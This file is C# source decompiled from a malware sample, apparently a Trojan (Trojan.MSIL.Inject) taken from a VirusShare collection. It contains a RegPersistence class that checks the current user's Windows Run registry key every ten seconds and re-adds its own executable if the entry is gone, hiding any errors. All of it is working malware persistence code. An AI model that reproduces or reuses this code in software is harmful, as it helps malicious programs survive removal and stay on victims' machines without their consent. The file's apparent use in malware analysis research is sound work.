// Decompiled with JetBrains decompiler
// Type: RegPersistence
// Assembly: donefreddy, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 12D74662-1023-4E0F-B3AE-6691B578C5B0
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan.MSIL.Inject.hu-cd23eca67c20a9aa847e307ab0ad3596b08ca9c78d5daedc3b9a565cd0fbf135.exe

using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.IO;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;

[StandardModule]
internal sealed class RegPersistence
{
  private static string MyValue = Path.GetFileName(Application.ExecutablePath);
  private static string MyPath = Assembly.GetExecutingAssembly().Location;

  public static void Persistence()
  {
    while (true)
    {
      if (!RegPersistence.CheckKey())
        RegPersistence.AddKey();
      Thread.Sleep(10000);
    }
  }

  private static bool CheckKey()
  {
    string str1 = (string) null;
    RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
    string[] valueNames = registryKey.GetValueNames();
    registryKey.Close();
    string[] strArray = valueNames;
    int index = 0;
    while (index < strArray.Length)
    {
      string str2 = strArray[index];
      str1 = str1 + str2 + "|";
      checked { ++index; }
    }
    return str1.Contains(RegPersistence.MyValue);
  }

  private static void AddKey()
  {
    try
    {
      RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
      registryKey.SetValue(RegPersistence.MyValue, (object) RegPersistence.MyPath);
      registryKey.Close();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }
}
